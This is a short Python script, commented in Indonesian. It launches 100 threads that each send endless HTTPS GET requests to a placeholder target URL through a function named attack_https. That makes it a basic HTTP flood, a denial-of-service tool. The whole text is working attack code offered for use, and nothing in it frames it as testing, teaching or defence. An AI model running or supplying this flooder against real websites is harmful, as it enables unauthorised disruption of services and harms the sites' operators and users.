import requests
import threading

def attack_https(url):
    while True:
        try:
            # Kirim request ke web HTTPS
            response = requests.get(url, verify=True)  # verify=True untuk SSL/TLS
            print(f"Request send to {url}, Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

url_target = "<target_url>"
jumlah_bot = 100  # Jumlah bot (thread)

for i in range(jumlah_bot):
    thread = threading.Thread(target=attack_https, args=(url_target,))
    thread.start()